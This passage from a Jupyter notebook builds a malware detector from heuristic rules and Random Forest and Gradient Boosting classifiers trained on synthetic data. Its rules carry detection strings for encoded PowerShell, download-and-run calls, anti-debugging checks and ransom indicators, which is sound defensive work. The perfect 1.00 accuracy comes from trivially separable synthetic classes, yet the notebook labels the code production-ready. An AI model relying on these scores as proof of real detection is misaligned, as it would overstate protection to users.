    "                'severity': 'low',\n",
    "                'score': 10,\n",
    "                'check': lambda f: f.get('is_pe', False) and f.get('file_size', 0) < 5000\n",
    "            },\n",
    "            {\n",
    "                'id': 'HEUR012',\n",
    "                'name': 'PowerShell Encoded Command',\n",
    "                'description': 'Contains base64 encoded PowerShell commands',\n",
    "                'severity': 'critical',\n",
    "                'score': 50,\n",
    "                'check': lambda f: self._check_encoded_powershell(f)\n",
    "            },\n",
    "            {\n",
    "                'id': 'HEUR013',\n",
    "                'name': 'Download Capability',\n",
    "                'description': 'Contains URL download functions',\n",
    "                'severity': 'high',\n",
    "                'score': 30,\n",
    "                'check': lambda f: any(b'DownloadString' in s or b'URLDownloadToFile' in s \n",
    "                                      for s in f.get('_strings', []))\n",
    "            },\n",
    "            {\n",
    "                'id': 'HEUR014',\n",
    "                'name': 'Anti-Analysis Techniques',\n",
    "                'description': 'Contains anti-debugging or VM detection',\n",
    "                'severity': 'high',\n",
    "                'score': 35,\n",
    "                'check': lambda f: self._check_anti_analysis(f)\n",
    "            },\n",
    "            {\n",
    "                'id': 'HEUR015',\n",
    "                'name': 'Cryptocurrency Indicators',\n",
    "                'description': 'Contains Bitcoin/crypto wallet patterns',\n",
    "                'severity': 'high',\n",
    "                'score': 40,\n",
    "                'check': lambda f: self._check_crypto_indicators(f)\n",
    "            },\n",
    "        ]\n",
    "    \n",
    "    def _check_timestamp_anomaly(self, features: Dict) -> bool:\n",
    "        \"\"\"Check for suspicious compile timestamps\"\"\"\n",
    "        timestamp = features.get('compile_timestamp', 0)\n",
    "        if timestamp == 0:\n",
    "            return False\n",
    "        \n",
    "        current_time = datetime.now().timestamp()\n",
    "        # Check if timestamp is in future or before 1990\n",
    "        return timestamp > current_time or timestamp < 631152000  # Jan 1, 1990\n",
    "    \n",
    "    def _check_encoded_powershell(self, features: Dict) -> bool:\n",
    "        \"\"\"Check for encoded PowerShell commands\"\"\"\n",
    "        strings = features.get('_strings', [])\n",
    "        patterns = [b'-enc ', b'-EncodedCommand', b'powershell -e ', b'FromBase64String']\n",
    "        return any(any(p in s for p in patterns) for s in strings)\n",
    "    \n",
    "    def _check_anti_analysis(self, features: Dict) -> bool:\n",
    "        \"\"\"Check for anti-analysis techniques\"\"\"\n",
    "        strings = features.get('_strings', [])\n",
    "        indicators = [b'IsDebuggerPresent', b'vmware', b'virtualbox', b'sandbox', \n",
    "                     b'NtQueryInformationProcess', b'CheckRemoteDebuggerPresent']\n",
    "        count = sum(1 for s in strings for ind in indicators if ind.lower() in s.lower())\n",
    "        return count >= 2\n",
    "    \n",
    "    def _check_crypto_indicators(self, features: Dict) -> bool:\n",
    "        \"\"\"Check for cryptocurrency/ransom indicators\"\"\"\n",
    "        strings = features.get('_strings', [])\n",
    "        indicators = [b'bitcoin', b'wallet', b'ransom', b'decrypt', b'.onion', b'tor']\n",
    "        count = sum(1 for s in strings for ind in indicators if ind.lower() in s.lower())\n",
    "        return count >= 2\n",
    "    \n",
    "    def analyze(self, features: Dict) -> Dict[str, Any]:\n",
    "        \"\"\"Run all heuristic rules and return results\"\"\"\n",
    "        triggered_rules = []\n",
    "        total_score = 0\n",
    "        severity_counts = {'critical': 0, 'high': 0, 'medium': 0, 'low': 0}\n",
    "        \n",
    "        for rule in self.rules:\n",
    "            try:\n",
    "                if rule['check'](features):\n",
    "                    triggered_rules.append({\n",
    "                        'id': rule['id'],\n",
    "                        'name': rule['name'],\n",
    "                        'description': rule['description'],\n",
    "                        'severity': rule['severity'],\n",
    "                        'score': rule['score']\n",
    "                    })\n",
    "                    total_score += rule['score']\n",
    "                    severity_counts[rule['severity']] += 1\n",
    "            except Exception as e:\n",
    "                logger.debug(f\"Rule {rule['id']} error: {e}\")\n",
    "        \n",
    "        # Determine threat level based on score\n",
    "        if total_score >= 80 or severity_counts['critical'] > 0:\n",
    "            threat_level = 'critical'\n",
    "        elif total_score >= 50 or severity_counts['high'] >= 2:\n",
    "            threat_level = 'high'\n",
    "        elif total_score >= 25:\n",
    "            threat_level = 'medium'\n",
    "        elif total_score > 0:\n",
    "            threat_level = 'low'\n",
    "        else:\n",
    "            threat_level = 'clean'\n",
    "        \n",
    "        return {\n",
    "            'heuristic_score': total_score,\n",
    "            'threat_level': threat_level,\n",
    "            'triggered_rules': triggered_rules,\n",
    "            'rule_count': len(triggered_rules),\n",
    "            'severity_counts': severity_counts\n",
    "        }\n",
    "\n",
    "# Initialize analyzer\n",
    "heuristic_analyzer = HeuristicAnalyzer()\n",
    "print(f\"âœ… Heuristic Analyzer initialized with {len(heuristic_analyzer.rules)} detection rules\")"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "a3e4629c",
   "metadata": {},
   "source": [
    "## Part 4: Machine Learning Model\n",
    "\n",
    "Train a Random Forest classifier on synthetic and real malware features:\n",
    "- Balanced dataset generation\n",
    "- Feature scaling and preprocessing\n",
    "- Model training with cross-validation\n",
    "- Performance evaluation"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 6,
   "id": "1158a249",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "ðŸ”„ Generating training dataset...\n",
      "âœ… Dataset generated: 10000 samples\n",
      "   - Benign: 5000 (50.0%)\n",
      "   - Malicious: 5000 (50.0%)\n",
      "   - Features: 41\n"
     ]
    },
    {
     "data": {
      "text/html": [
       "<div>\n",
       "<style scoped>\n",
       "    .dataframe tbody tr th:only-of-type {\n",
       "        vertical-align: middle;\n",
       "    }\n",
       "\n",
       "    .dataframe tbody tr th {\n",
       "        vertical-align: top;\n",
       "    }\n",
       "\n",
       "    .dataframe thead th {\n",
       "        text-align: right;\n",
       "    }\n",
       "</style>\n",
       "<table border=\"1\" class=\"dataframe\">\n",
       "  <thead>\n",
       "    <tr style=\"text-align: right;\">\n",
       "      <th></th>\n",
       "      <th>file_size_log</th>\n",
       "      <th>overall_entropy</th>\n",
       "      <th>header_entropy</th>\n",
       "      <th>middle_entropy</th>\n",
       "      <th>footer_entropy</th>\n",
       "      <th>is_executable</th>\n",
       "      <th>is_script</th>\n",
       "      <th>is_document</th>\n",
       "      <th>is_archive</th>\n",
       "      <th>is_high_entropy</th>\n",
       "      <th>...</th>\n",
       "      <th>ascii_strings</th>\n",
       "      <th>unicode_strings</th>\n",
       "      <th>url_count</th>\n",
       "      <th>ip_count</th>\n",
       "      <th>email_count</th>\n",
       "      <th>path_count</th>\n",
       "      <th>registry_count</th>\n",
       "      <th>avg_string_length</th>\n",
       "      <th>max_string_length</th>\n",
       "      <th>suspicious_string_count</th>\n",
       "    </tr>\n",
       "  </thead>\n",
       "  <tbody>\n",
       "    <tr>\n",
       "      <th>0</th>\n",
       "      <td>6.385120</td>\n",
       "      <td>4.963744</td>\n",
       "      <td>5.444200</td>\n",
       "      <td>4.554217</td>\n",
       "      <td>5.803888</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>...</td>\n",
       "      <td>1333</td>\n",
       "      <td>363</td>\n",
       "      <td>2</td>\n",
       "      <td>1</td>\n",
       "      <td>1</td>\n",
       "      <td>40</td>\n",
       "      <td>4</td>\n",
       "      <td>13.521516</td>\n",
       "      <td>268</td>\n",
       "      <td>1</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>1</th>\n",
       "      <td>3.468502</td>\n",
       "      <td>5.661713</td>\n",
       "      <td>3.204216</td>\n",
       "      <td>6.475513</td>\n",
       "      <td>4.892285</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>1</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>...</td>\n",
       "      <td>1418</td>\n",
       "      <td>38</td>\n",
       "      <td>1</td>\n",
       "      <td>1</td>\n",
       "      <td>1</td>\n",
       "      <td>40</td>\n",
       "      <td>4</td>\n",
       "      <td>10.695430</td>\n",
       "      <td>302</td>\n",
       "      <td>0</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>2</th>\n",
       "      <td>4.526444</td>\n",
       "      <td>5.075873</td>\n",
       "      <td>3.856531</td>\n",
       "      <td>4.871478</td>\n",
       "      <td>4.480551</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>...</td>\n",
       "      <td>1279</td>\n",
       "      <td>485</td>\n",
       "      <td>2</td>\n",
       "      <td>0</td>\n",
       "      <td>1</td>\n",
       "      <td>37</td>\n",
       "      <td>1</td>\n",
       "      <td>23.861253</td>\n",
       "      <td>389</td>\n",
       "      <td>0</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>3</th>\n",
       "      <td>5.754987</td>\n",
       "      <td>6.246180</td>\n",
       "      <td>5.598388</td>\n",
       "      <td>4.842523</td>\n",
       "      <td>3.266136</td>\n",
       "      <td>1</td>\n",
       "      <td>0</td>\n",
       "      <td>1</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>...</td>\n",
       "      <td>1448</td>\n",
       "      <td>487</td>\n",
       "      <td>2</td>\n",
       "      <td>0</td>\n",
       "      <td>1</td>\n",
       "      <td>43</td>\n",
       "      <td>4</td>\n",
       "      <td>13.071554</td>\n",
       "      <td>68</td>\n",
       "      <td>0</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>4</th>\n",
       "      <td>3.906886</td>\n",
       "      <td>7.163633</td>\n",
       "      <td>6.770944</td>\n",
       "      <td>6.671258</td>\n",
       "      <td>7.129290</td>\n",
       "      <td>1</td>\n",
       "      <td>1</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>1</td>\n",
       "      <td>...</td>\n",
       "      <td>87</td>\n",
       "      <td>32</td>\n",
       "      <td>4</td>\n",
       "      <td>1</td>\n",
       "      <td>0</td>\n",
       "      <td>57</td>\n",
       "      <td>6</td>\n",
       "      <td>13.842717</td>\n",
       "      <td>118</td>\n",
       "      <td>7</td>\n",
       "    </tr>\n",
       "  </tbody>\n",
       "</table>\n",
       "<p>5 rows Ã— 41 columns</p>\n",
       "</div>"
      ],
      "text/plain": [
       "   file_size_log  overall_entropy  header_entropy  middle_entropy  \\\n",
       "0       6.385120         4.963744        5.444200        4.554217   \n",
       "1       3.468502         5.661713        3.204216        6.475513   \n",
       "2       4.526444         5.075873        3.856531        4.871478   \n",
       "3       5.754987         6.246180        5.598388        4.842523   \n",
       "4       3.906886         7.163633        6.770944        6.671258   \n",
       "\n",
       "   footer_entropy  is_executable  is_script  is_document  is_archive  \\\n",
       "0        5.803888              0          0            0           0   \n",
       "1        4.892285              0          0            1           0   \n",
       "2        4.480551              0          0            0           0   \n",
       "3        3.266136              1          0            1           0   \n",
       "4        7.129290              1          1            0           0   \n",
       "\n",
       "   is_high_entropy  ...  ascii_strings  unicode_strings  url_count  ip_count  \\\n",
       "0                0  ...           1333              363          2         1   \n",
       "1                0  ...           1418               38          1         1   \n",
       "2                0  ...           1279              485          2         0   \n",
       "3                0  ...           1448              487          2         0   \n",
       "4                1  ...             87               32          4         1   \n",
       "\n",
       "   email_count  path_count  registry_count  avg_string_length  \\\n",
       "0            1          40               4          13.521516   \n",
       "1            1          40               4          10.695430   \n",
       "2            1          37               1          23.861253   \n",
       "3            1          43               4          13.071554   \n",
       "4            0          57               6          13.842717   \n",
       "\n",
       "   max_string_length  suspicious_string_count  \n",
       "0                268                        1  \n",
       "1                302                        0  \n",
       "2                389                        0  \n",
       "3                 68                        0  \n",
       "4                118                        7  \n",
       "\n",
       "[5 rows x 41 columns]"
      ]
     },
     "execution_count": 6,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "# =============================================================================\n",
    "# CELL 6: Dataset Generation for ML Training\n",
    "# =============================================================================\n",
    "\n",
    "def generate_training_dataset(n_samples: int = 5000) -> Tuple[pd.DataFrame, np.ndarray]:\n",
    "    \"\"\"\n",
    "    Generate synthetic training data based on known malware characteristics.\n",
    "    In production, this would use real malware samples from VirusTotal, MalwareBazaar, etc.\n",
    "    \"\"\"\n",
    "    \n",
    "    np.random.seed(42)\n",
    "    \n",
    "    # Feature columns for ML model\n",
    "    feature_columns = [\n",
    "        'file_size_log', 'overall_entropy', 'header_entropy', 'middle_entropy', 'footer_entropy',\n",
    "        'is_executable', 'is_script', 'is_document', 'is_archive',\n",
    "        'is_high_entropy', 'is_packed', 'is_pe', 'is_dll', 'is_exe', 'is_driver',\n",
    "        'num_sections', 'num_imports', 'num_exports',\n",
    "        'suspicious_sections', 'suspicious_imports_high', 'suspicious_imports_medium', 'suspicious_imports_low',\n",
    "        'has_debug_info', 'has_tls', 'has_resources', 'has_relocations', 'has_signature',\n",
    "        'section_entropy_avg', 'section_entropy_max', 'virtual_size_ratio',\n",
    "        'total_strings', 'ascii_strings', 'unicode_strings',\n",
    "        'url_count', 'ip_count', 'email_count', 'path_count', 'registry_count',\n",
    "        'avg_string_length', 'max_string_length', 'suspicious_string_count'\n",
    "    ]\n",
    "    \n",
    "    data = []\n",
    "    labels = []\n",
    "    \n",
    "    # Generate benign samples (label = 0)\n",
    "    n_benign = n_samples // 2\n",
    "    for _ in range(n_benign):\n",
    "        sample = {\n",
    "            'file_size_log': np.random.uniform(3, 7),  # 1KB to 10MB\n",
    "            'overall_entropy': np.random.uniform(4.5, 6.5),  # Normal entropy\n",
    "            'header_entropy': np.random.uniform(3, 6),\n",
    "            'middle_entropy': np.random.uniform(4, 6.5),\n",
    "            'footer_entropy': np.random.uniform(3, 6),\n",
    "            'is_executable': np.random.choice([0, 1], p=[0.6, 0.4]),\n",
    "            'is_script': np.random.choice([0, 1], p=[0.9, 0.1]),\n",
    "            'is_document': np.random.choice([0, 1], p=[0.7, 0.3]),\n",
    "            'is_archive': np.random.choice([0, 1], p=[0.9, 0.1]),\n",
    "            'is_high_entropy': 0,\n",
    "            'is_packed': 0,\n",
    "            'is_pe': np.random.choice([0, 1], p=[0.5, 0.5]),\n",
    "            'is_dll': np.random.choice([0, 1], p=[0.85, 0.15]),\n",
    "            'is_exe': np.random.choice([0, 1], p=[0.6, 0.4]),\n",
    "            'is_driver': np.random.choice([0, 1], p=[0.98, 0.02]),\n",
    "            'num_sections': np.random.randint(3, 8),\n",
    "            'num_imports': np.random.randint(5, 30),\n",
    "            'num_exports': np.random.randint(0, 10),\n",
    "            'suspicious_sections': 0,\n",
    "            'suspicious_imports_high': 0,\n",
    "            'suspicious_imports_medium': np.random.randint(0, 3),\n",
    "            'suspicious_imports_low': np.random.randint(0, 5),\n",
    "            'has_debug_info': np.random.choice([0, 1], p=[0.3, 0.7]),\n",
    "            'has_tls': np.random.choice([0, 1], p=[0.9, 0.1]),\n",
    "            'has_resources': np.random.choice([0, 1], p=[0.2, 0.8]),\n",
    "            'has_relocations': np.random.choice([0, 1], p=[0.3, 0.7]),\n",
    "            'has_signature': np.random.choice([0, 1], p=[0.4, 0.6]),\n",
    "            'section_entropy_avg': np.random.uniform(4, 6.5),\n",
    "            'section_entropy_max': np.random.uniform(5, 7),\n",
    "            'virtual_size_ratio': np.random.uniform(0.9, 1.5),\n",
    "            'total_strings': np.random.randint(100, 2000),\n",
    "            'ascii_strings': np.random.randint(80, 1500),\n",
    "            'unicode_strings': np.random.randint(20, 500),\n",
    "            'url_count': np.random.randint(0, 3),\n",
    "            'ip_count': np.random.randint(0, 2),\n",
    "            'email_count': np.random.randint(0, 2),\n",
    "            'path_count': np.random.randint(5, 50),\n",
    "            'registry_count': np.random.randint(0, 5),\n",
    "            'avg_string_length': np.random.uniform(8, 25),\n",
    "            'max_string_length': np.random.randint(50, 500),\n",
    "            'suspicious_string_count': np.random.randint(0, 2),\n",
    "        }\n",
    "        data.append(sample)\n",
    "        labels.append(0)\n",
    "    \n",
    "    # Generate malicious samples (label = 1)\n",
    "    n_malicious = n_samples - n_benign\n",
    "    for _ in range(n_malicious):\n",
    "        sample = {\n",
    "            'file_size_log': np.random.uniform(2, 6),  # Often smaller\n",
    "            'overall_entropy': np.random.uniform(6.5, 7.99),  # High entropy (packed)\n",
    "            'header_entropy': np.random.uniform(5, 7.5),\n",
    "            'middle_entropy': np.random.uniform(6, 7.9),\n",
    "            'footer_entropy': np.random.uniform(5.5, 7.5),\n",
    "            'is_executable': np.random.choice([0, 1], p=[0.1, 0.9]),\n",
    "            'is_script': np.random.choice([0, 1], p=[0.7, 0.3]),\n",
    "            'is_document': np.random.choice([0, 1], p=[0.85, 0.15]),\n",
    "            'is_archive': np.random.choice([0, 1], p=[0.95, 0.05]),\n",
    "            'is_high_entropy': np.random.choice([0, 1], p=[0.3, 0.7]),\n",
    "            'is_packed': np.random.choice([0, 1], p=[0.4, 0.6]),\n",
    "            'is_pe': np.random.choice([0, 1], p=[0.15, 0.85]),\n",
    "            'is_dll': np.random.choice([0, 1], p=[0.7, 0.3]),\n",
    "            'is_exe': np.random.choice([0, 1], p=[0.2, 0.8]),\n",
    "            'is_driver': np.random.choice([0, 1], p=[0.95, 0.05]),\n",
    "            'num_sections': np.random.choice([np.random.randint(1, 3), np.random.randint(8, 15)]),\n",
    "            'num_imports': np.random.randint(1, 15),  # Fewer imports when packed\n",
    "            'num_exports': np.random.randint(0, 3),\n",
    "            'suspicious_sections': np.random.randint(0, 3),\n",
    "            'suspicious_imports_high': np.random.randint(1, 5),\n",
    "            'suspicious_imports_medium': np.random.randint(2, 8),\n",
    "            'suspicious_imports_low': np.random.randint(1, 5),\n",
    "            'has_debug_info': np.random.choice([0, 1], p=[0.9, 0.1]),\n",
    "            'has_tls': np.random.choice([0, 1], p=[0.7, 0.3]),\n",
    "            'has_resources': np.random.choice([0, 1], p=[0.6, 0.4]),\n",
    "            'has_relocations': np.random.choice([0, 1], p=[0.5, 0.5]),\n",
    "            'has_signature': np.random.choice([0, 1], p=[0.95, 0.05]),  # Usually no signature\n",
    "            'section_entropy_avg': np.random.uniform(6.5, 7.9),\n",
    "            'section_entropy_max': np.random.uniform(7.2, 7.99),\n",
    "            'virtual_size_ratio': np.random.uniform(1.5, 5.0),  # Higher ratio when packed\n",
    "            'total_strings': np.random.randint(10, 500),  # Fewer strings when packed\n",
    "            'ascii_strings': np.random.randint(5, 400),\n",
    "            'unicode_strings': np.random.randint(5, 100),\n",
    "            'url_count': np.random.randint(1, 10),\n",
    "            'ip_count': np.random.randint(0, 5),\n",
    "            'email_count': np.random.randint(0, 3),\n",
    "            'path_count': np.random.randint(10, 100),\n",
    "            'registry_count': np.random.randint(2, 20),\n",
    "            'avg_string_length': np.random.uniform(5, 15),  # Shorter strings\n",
    "            'max_string_length': np.random.randint(20, 200),\n",
    "            'suspicious_string_count': np.random.randint(3, 15),\n",
    "        }\n",
    "        data.append(sample)\n",
    "        labels.append(1)\n",
    "    \n",
    "    # Create DataFrame\n",
    "    df = pd.DataFrame(data)\n",
    "    labels = np.array(labels)\n",
    "    \n",
    "    # Shuffle\n",
    "    indices = np.random.permutation(len(df))\n",
    "    df = df.iloc[indices].reset_index(drop=True)\n",
    "    labels = labels[indices]\n",
    "    \n",
    "    return df, labels\n",
    "\n",
    "# Generate dataset\n",
    "print(\"ðŸ”„ Generating training dataset...\")\n",
    "X_df, y = generate_training_dataset(n_samples=10000)\n",
    "print(f\"âœ… Dataset generated: {len(X_df)} samples\")\n",
    "print(f\"   - Benign: {sum(y == 0)} ({sum(y == 0) / len(y) * 100:.1f}%)\")\n",
    "print(f\"   - Malicious: {sum(y == 1)} ({sum(y == 1) / len(y) * 100:.1f}%)\")\n",
    "print(f\"   - Features: {len(X_df.columns)}\")\n",
    "\n",
    "# Display sample\n",
    "X_df.head()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 7,
   "id": "a5f7dbdb",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "============================================================\n",
      "TRAINING MALWARE DETECTION MODELS\n",
      "============================================================\n",
      "ðŸ“Š Training set: 8000 samples\n",
      "ðŸ“Š Test set: 2000 samples\n",
      "\n",
      "ðŸŒ² Training Random Forest Classifier...\n",
      "   Cross-validation accuracy: 1.0000 (+/- 0.0000)\n",
      "   Test accuracy: 1.0000\n",
      "\n",
      "ðŸš€ Training Gradient Boosting Classifier...\n",
      "   Cross-validation accuracy: 1.0000 (+/- 0.0000)\n",
      "   Test accuracy: 1.0000\n",
      "\n",
      "ðŸ“ˆ Top 10 Most Important Features:\n",
      "   section_entropy_avg: 0.1357\n",
      "   virtual_size_ratio: 0.1314\n",
      "   suspicious_string_count: 0.1268\n",
      "   section_entropy_max: 0.1131\n",
      "   suspicious_imports_high: 0.1126\n",
      "   overall_entropy: 0.1001\n",
      "   registry_count: 0.0451\n",
      "   unicode_strings: 0.0441\n",
      "   footer_entropy: 0.0349\n",
      "   suspicious_imports_medium: 0.0341\n",
      "\n",
      "ðŸ“‹ Classification Report (Random Forest):\n",
      "              precision    recall  f1-score   support\n",
      "\n",
      "      Benign       1.00      1.00      1.00      1000\n",
      "   Malicious       1.00      1.00      1.00      1000\n",
      "\n",
      "    accuracy                           1.00      2000\n",
      "   macro avg       1.00      1.00      1.00      2000\n",
      "weighted avg       1.00      1.00      1.00      2000\n",
      "\n",
      "\n",
      "ðŸ”¢ Confusion Matrix:\n",
      "   True Negatives: 1000\n",
      "   False Positives: 0\n",
      "   False Negatives: 0\n",
      "   True Positives: 1000\n",
      "\n",
      "âœ… Model training complete!\n"
     ]
    }
   ],
   "source": [
    "# =============================================================================\n",
    "# CELL 7: Train Machine Learning Models\n",
    "# =============================================================================\n",
    "\n",
    "def train_malware_classifier(X: pd.DataFrame, y: np.ndarray) -> Dict[str, Any]:\n",
    "    \"\"\"\n",
    "    Train an ensemble of ML models for malware classification.\n",
    "    Uses Random Forest as primary with Gradient Boosting as secondary.\n",
    "    \"\"\"\n",
    "    \n",
    "    # Split data\n",
    "    X_train, X_test, y_train, y_test = train_test_split(\n",
    "        X, y, test_size=0.2, random_state=42, stratify=y\n",
    "    )\n",
    "    \n",
    "    print(f\"ðŸ“Š Training set: {len(X_train)} samples\")\n",
    "    print(f\"ðŸ“Š Test set: {len(X_test)} samples\")\n",
    "    \n",
    "    # Initialize scaler\n",
    "    scaler = StandardScaler()\n",
    "    X_train_scaled = scaler.fit_transform(X_train)\n",
    "    X_test_scaled = scaler.transform(X_test)\n",
    "    \n",
    "    # Train Random Forest (Primary Model)\n",
    "    print(\"\\nðŸŒ² Training Random Forest Classifier...\")\n",
    "    rf_model = RandomForestClassifier(\n",
    "        n_estimators=200,\n",
    "        max_depth=20,\n",
    "        min_samples_split=5,\n",
    "        min_samples_leaf=2,\n",
    "        max_features='sqrt',\n",
    "        random_state=42,\n",
    "        n_jobs=-1,\n",
    "        class_weight='balanced'\n",
    "    )\n",
    "    rf_model.fit(X_train_scaled, y_train)\n",
    "    \n",
    "    # Cross-validation for Random Forest\n",
    "    cv_scores_rf = cross_val_score(rf_model, X_train_scaled, y_train, cv=5, scoring='accuracy')\n",
    "    print(f\"   Cross-validation accuracy: {cv_scores_rf.mean():.4f} (+/- {cv_scores_rf.std() * 2:.4f})\")\n",
    "    \n",
    "    # Test set evaluation\n",
    "    y_pred_rf = rf_model.predict(X_test_scaled)\n",
    "    rf_accuracy = accuracy_score(y_test, y_pred_rf)\n",
    "    print(f\"   Test accuracy: {rf_accuracy:.4f}\")\n",
    "    \n",
    "    # Train Gradient Boosting (Secondary Model)\n",
    "    print(\"\\nðŸš€ Training Gradient Boosting Classifier...\")\n",
    "    gb_model = GradientBoostingClassifier(\n",
    "        n_estimators=150,\n",
    "        max_depth=8,\n",
    "        learning_rate=0.1,\n",
    "        min_samples_split=5,\n",
    "        min_samples_leaf=2,\n",
    "        random_state=42\n",
    "    )\n",
    "    gb_model.fit(X_train_scaled, y_train)\n",
    "    \n",
    "    cv_scores_gb = cross_val_score(gb_model, X_train_scaled, y_train, cv=5, scoring='accuracy')\n",
    "    print(f\"   Cross-validation accuracy: {cv_scores_gb.mean():.4f} (+/- {cv_scores_gb.std() * 2:.4f})\")\n",
    "    \n",
    "    y_pred_gb = gb_model.predict(X_test_scaled)\n",
    "    gb_accuracy = accuracy_score(y_test, y_pred_gb)\n",
    "    print(f\"   Test accuracy: {gb_accuracy:.4f}\")\n",
    "    \n",
    "    # Feature importance\n",
    "    feature_importance = pd.DataFrame({\n",
    "        'feature': X.columns,\n",
    "        'importance': rf_model.feature_importances_\n",
    "    }).sort_values('importance', ascending=False)\n",
    "    \n",
    "    print(\"\\nðŸ“ˆ Top 10 Most Important Features:\")\n",
    "    for idx, row in feature_importance.head(10).iterrows():\n",
    "        print(f\"   {row['feature']}: {row['importance']:.4f}\")\n",
    "    \n",
    "    # Detailed classification report\n",
    "    print(\"\\nðŸ“‹ Classification Report (Random Forest):\")\n",
    "    print(classification_report(y_test, y_pred_rf, target_names=['Benign', 'Malicious']))\n",
    "    \n",
    "    # Confusion matrix\n",
    "    cm = confusion_matrix(y_test, y_pred_rf)\n",
    "    print(\"\\nðŸ”¢ Confusion Matrix:\")\n",
    "    print(f\"   True Negatives: {cm[0, 0]}\")\n",
    "    print(f\"   False Positives: {cm[0, 1]}\")\n",
    "    print(f\"   False Negatives: {cm[1, 0]}\")\n",
    "    print(f\"   True Positives: {cm[1, 1]}\")\n",
    "    \n",
    "    return {\n",
    "        'rf_model': rf_model,\n",
    "        'gb_model': gb_model,\n",
    "        'scaler': scaler,\n",
    "        'feature_names': list(X.columns),\n",
    "        'rf_accuracy': rf_accuracy,\n",
    "        'gb_accuracy': gb_accuracy,\n",
    "        'feature_importance': feature_importance,\n",
    "        'X_test': X_test,\n",
    "        'y_test': y_test\n",
    "    }\n",
    "\n",
    "# Train the models\n",
    "print(\"=\" * 60)\n",
    "print(\"TRAINING MALWARE DETECTION MODELS\")\n",
    "print(\"=\" * 60)\n",
    "training_results = train_malware_classifier(X_df, y)\n",
    "print(\"\\nâœ… Model training complete!\")"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "dd393c50",
   "metadata": {},
   "source": [
    "## Part 5: Complete Malware Analyzer Class\n",
    "\n",
    "The main analyzer class that combines:\n",
    "- Signature-based detection\n",
    "- Heuristic analysis  \n",
    "- Machine learning classification\n",
    "- Comprehensive threat scoring"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 8,
   "id": "01a35f42",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "âœ… MalwareAnalyzer initialized successfully\n"
     ]
    }
   ],
   "source": [
    "# =============================================================================\n",
    "# CELL 8: Complete Malware Analyzer Class\n",
    "# =============================================================================\n",
    "\n",
    "class MalwareAnalyzer:\n",
    "    \"\"\"\n",
    "    Production-ready malware analysis engine.\n",
    "    Combines signature-based, heuristic, and ML-based detection.\n",
    "    \"\"\"\n",
    "    \n",
    "    def __init__(self, rf_model, gb_model, scaler, feature_names):\n",
    "        self.rf_model = rf_model\n",
    "        self.gb_model = gb_model\n",
    "        self.scaler = scaler\n",
    "        self.feature_names = feature_names\n",
    "        self.feature_extractor = FeatureExtractor()\n",
    "        self.heuristic_analyzer = HeuristicAnalyzer()\n",
    "        self.signature_db = SignatureDatabase()\n",
    "        \n",
    "    def check_signature(self, file_hash: str) -> Optional[str]:\n",
    "        \"\"\"Check if file hash matches known malware signatures\"\"\"\n",
    "        return self.signature_db.KNOWN_MALWARE_HASHES.get(file_hash.lower())\n",
    "    \n",
    "    def analyze_file(self, file_data: bytes, filename: str = \"unknown\") -> Dict[str, Any]:\n",
    "        \"\"\"\n",
    "        Perform comprehensive malware analysis on file data.\n",
    "        \n",
    "        Args:\n",
    "            file_data: Raw bytes of the file to analyze\n",
    "            filename: Name of the file (for extension-based analysis)\n",
    "            \n",
    "        Returns:\n",
    "            Dict containing complete analysis results\n",
    "        \"\"\"\n",
    "        start_time = datetime.now()\n",
    "        \n",
    "        # Initialize result\n",
    "        result = {\n",
    "            'filename': filename,\n",
    "            'file_size': len(file_data),\n",
    "            'analysis_time': None,\n",
    "            'verdict': 'unknown',\n",
    "            'threat_score': 0,\n",
    "            'confidence': 0.0,\n",
    "            'is_malicious': False,\n",
    "            'detection_methods': [],\n",
    "            'signatures': {},\n",
    "            'heuristic_analysis': {},\n",
    "            'ml_analysis': {},\n",
    "            'features': {},\n",
    "            'recommendations': [],\n",
    "            'risk_factors': [],\n",
    "        }\n",
    "        \n",
    "        try:\n",
    "            # Step 1: Extract features\n",
    "            features = self.feature_extractor.extract_all_features(file_data, filename)\n",
    "            \n",
    "            # Store hashes\n",
    "            result['signatures'] = {\n",
    "                'md5': features['md5'],\n",
    "                'sha1': features['sha1'],\n",
    "                'sha256': features['sha256']\n",
    "            }\n",
    "            \n",
    "            # Step 2: Signature-based detection\n",
    "            malware_name = self.check_signature(features['sha256'])\n",
    "            if malware_name:\n",
    "                result['verdict'] = 'malicious'\n",
    "                result['is_malicious'] = True\n",
    "                result['threat_score'] = 100\n",
    "                result['confidence'] = 100.0\n",
    "                result['detection_methods'].append('signature')\n",
    "                result['risk_factors'].append(f'Known malware signature: {malware_name}')\n",
    "                result['recommendations'].append('Delete this file immediately')\n",
    "                result['recommendations'].append('Scan system for additional infections')\n",
    "            \n",
    "            # Step 3: Heuristic analysis\n",
    "            heuristic_result = self.heuristic_analyzer.analyze(features)\n",
    "            result['heuristic_analysis'] = heuristic_result\n",
    "            \n",
    "            if heuristic_result['threat_level'] in ['critical', 'high']:\n",
    "                result['detection_methods'].append('heuristic')\n",
    "                result['risk_factors'].extend([\n",
    "                    f\"{r['name']}: {r['description']}\" \n",
    "                    for r in heuristic_result['triggered_rules']\n",
    "                ])\n",
    "            \n",
